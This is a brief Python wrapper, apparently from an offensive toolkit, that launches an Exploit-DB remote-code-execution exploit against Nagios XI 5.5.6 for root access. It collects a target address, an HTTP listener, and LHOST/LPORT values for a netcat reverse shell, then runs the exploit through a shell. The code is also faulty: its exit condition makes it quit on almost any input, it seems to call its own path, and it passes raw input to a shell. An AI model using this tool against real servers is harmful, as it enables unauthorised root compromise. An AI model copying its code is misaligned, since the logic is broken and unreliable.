# /usr/share/exploitdb/exploits/linux/webapps/46221.py

import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


target = input(f"{Colors.red}(Nagios 5.5.6 RCE as root){Colors.end} [Nagios XI IP Address]:~#")
http_listener_ip = input(f"{Colors.red}(Nagios 5.5.6 RCE as root){Colors.end} [HTTP Listener Ip Address]:~#")
http_listener_port = input(f"{Colors.red}(Nagios 5.5.6 RCE as root){Colors.end} [HTTP Listener Port]:~#")
lhost = input(f"{Colors.red}(Nagios 5.5.6 RCE as root){Colors.end} [Enter LHOST]:~#")
lport = int(input(f"{Colors.red}(Nagios 5.5.6 RCE as root){Colors.end} [Enter LPORT]:~#"))
if target or http_listener_ip or http_listener_port or lhost or lport == "back" or target or http_listener_ip or http_listener_port or lhost or lport == "exit":
    exit(0)
else:
    sub.call(
        f"python /usr/share/exploitdb/exploits/linux/webapps/46221.py -t {target} -ip {http_listener_ip} -port {http_listener_port} -ncip {lhost} -ncport {lport}",
        shell=True)
